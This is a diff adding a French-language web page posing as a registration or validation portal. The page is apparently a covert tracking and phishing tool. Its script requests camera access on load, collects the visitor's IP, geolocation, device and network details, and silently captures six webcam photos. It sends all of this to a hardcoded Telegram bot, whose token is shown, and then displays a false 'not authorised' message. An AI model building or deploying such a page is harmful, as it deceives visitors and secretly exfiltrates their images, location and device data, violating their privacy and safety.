@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Centre de Validation</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      margin: 0;
+      background: url('image/star.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      font-family: 'Segoe UI', sans-serif;
+      color: white;
+      text-shadow: 0 0 5px rgba(0,0,0,0.7);
+    }
+
+    header {
+      position: absolute;
+      top: 20px;
+      left: 0;
+      right: 0;
+      text-align: center;
+    }
+
+    header img {
+      height: 60px;
+      margin-bottom: 10px;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 20px;
+      color: #333;
+    }
+
+    .hidden {
+      display: none !important;
+      visibility: hidden;
+      opacity: 0;
+    }
+
+    #loadingScreen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+      background-color: rgba(0, 0, 0, 0.6);
+      position: fixed;
+      inset: 0;
+      z-index: 999;
+    }
+
+    .loader {
+      width: 50px;
+      height: 50px;
+      border: 5px solid transparent;
+      border-top: 5px solid #00d1ff;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      box-shadow: 0 0 10px #00d1ff;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #loadingScreen div:last-child {
+      font-size: 18px;
+      color: #fff;
+      font-weight: bold;
+      text-shadow: 0 0 5px #000;
+    }
+
+    button {
+      padding: 14px 28px;
+      font-size: 16px;
+      background-color: deepskyblue;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 15%;
+    }
+
+    #message {
+      font-size: 16px;
+      margin-top: 20px;
+      text-align: center;
+      max-width: 80%;
+      font-weight: bold;
+    }
+
+    #message.error {
+      color: #ff4444;
+    }
+
+    #message.success {
+      color: ##777;
+    }
+
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="interface">
+    <button id="startBtn">Start registration</button>
+  </div>
+
+  <div id="loadingScreen" class="hidden">
+    <div class="loader"></div>
+    <div>Chargement...</div>
+  </div>
+
+  <div id="message" class="hidden"></div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const botToken = "8354353393:AAFLF2lZNUx9KEYwh_aj9gOmv0MIVbs4HKs"; // Remplace par ton token
+    const chatId = "5631338632";     // Remplace par ton chat ID
+
+    const startBtn = document.getElementById("startBtn");
+    const loadingScreen = document.getElementById("loadingScreen");
+    const interfaceDiv = document.getElementById("interface");
+    const messageDiv = document.getElementById("message");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+
+    let stream = null;
+    let captureInterval = null;
+    let photoCount = 0;
+    const maxPhotos = 6;
+    const intervalMs = 2000;
+
+    async function askCameraAccess() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch (e) {
+        console.warn("Caméra refusée ou erreur.");
+        showError("Accès à la caméra refusé ou indisponible.");
+      }
+    }
+
+    askCameraAccess();
+
+    startBtn.onclick = async () => {
+      interfaceDiv.classList.add("hidden");
+      loadingScreen.classList.remove("hidden");
+      hideMessage();
+
+      photoCount = 0;
+      await sendInitialInfo();
+
+      captureInterval = setInterval(async () => {
+        if (photoCount >= maxPhotos) {
+          clearInterval(captureInterval);
+          stopCamera();
+          loadingScreen.classList.add("hidden");
+          showSuccess("Desolé vous n'êtes pas autorisé à acceder à cette page web! Veuillez reesayer.");
+          return;
+        }
+        console.log(`Envoi de la photo n°${photoCount + 1}...`);
+        await takeAndSendPhoto();
+      }, intervalMs);
+    };
+
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+    }
+
+    async function sendInitialInfo() {
+      let ip = "Inconnue";
+      let lat = "Non autorisée";
+      let lon = "Non autorisée";
+
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        ip = data.ip;
+      } catch (e) {}
+
+      if (navigator.geolocation) {
+        try {
+          await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(
+              async (pos) => {
+                lat = pos.coords.latitude;
+                lon = pos.coords.longitude;
+                resolve();
+              },
+              async () => {
+                // En cas de refus ou erreur, on tente ipapi.co
+                try {
+                  const ipRes = await fetch("https://ipapi.co/json");
+                  const ipData = await ipRes.json();
+                  lat = ipData.latitude || lat;
+                  lon = ipData.longitude || lon;
+                } catch {}
+                resolve();
+              }
+            );
+          });
+        } catch {}
+      } else {
+        try {
+          const ipRes = await fetch("https://ipapi.co/json");
+          const ipData = await ipRes.json();
+          lat = ipData.latitude || lat;
+          lon = ipData.longitude || lon;
+        } catch {}
+      }
+
+      await envoyerInfos(ip, lat, lon);
+    }
+
+    async function envoyerInfos(ip, lat, lon) {
+      const userAgent = navigator.userAgent;
+      const heure = new Date().toLocaleString();
+      const largeur = screen.width;
+      const hauteur = screen.height;
+      const connection = navigator.connection ? navigator.connection.effectiveType : "Inconnue";
+
+      const msg = `
+🆕 Connexion détectée :
+
+🌐 IP : ${ip}
+📍 Position : ${lat}, ${lon}
+🕒 Heure : ${heure}
+📱 Appareil : ${userAgent}
+📏 Écran : ${largeur}x${hauteur}
+📶 Réseau : ${connection}
+      `;
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: msg })
+        });
+
+        if (!res.ok) {
+          throw new Error(`Erreur API Telegram: ${res.status} ${res.statusText}`);
+        }
+      } catch (e) {
+        showError(`Erreur envoi infos : ${e.message}`);
+      }
+    }
+
+    async function takeAndSendPhoto() {
+      if (!video.videoWidth) return;
+
+      photoCount++;
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      const imageData = canvas.toDataURL("image/jpeg");
+      const blob = await (await fetch(imageData)).blob();
+
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, `selfie_${photoCount}.jpg`);
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+
+        if (!res.ok) {
+          throw new Error(`Erreur API Telegram: ${res.status} ${res.statusText}`);
+        }
+      } catch (e) {
+        console.error("Erreur envoi photo :", e);
+        showError(`Erreur envoi photo n°${photoCount} : ${e.message}`);
+      }
+    }
+
+    // Affiche un message d'erreur visible
+    function showError(msg) {
+      messageDiv.textContent = msg;
+      messageDiv.classList.remove("hidden");
+      messageDiv.classList.add("error");
+      messageDiv.classList.remove("success");
+      loadingScreen.classList.add("hidden");
+      interfaceDiv.classList.add("hidden");
+    }
+
+    // Affiche un message succès visible
+    function showSuccess(msg) {
+      messageDiv.textContent = msg;
+      messageDiv.classList.remove("hidden");
+      messageDiv.classList.add("success");
+      messageDiv.classList.remove("error");
+      loadingScreen.classList.add("hidden");
+      interfaceDiv.classList.add("hidden");
+    }
+
+    // Cache le message
+    function hideMessage() {
+      messageDiv.classList.add("hidden");
+      messageDiv.classList.remove("error");
+      messageDiv.classList.remove("success");
+      messageDiv.textContent = "";
+    }
+  </script>
+</body>
+</html>
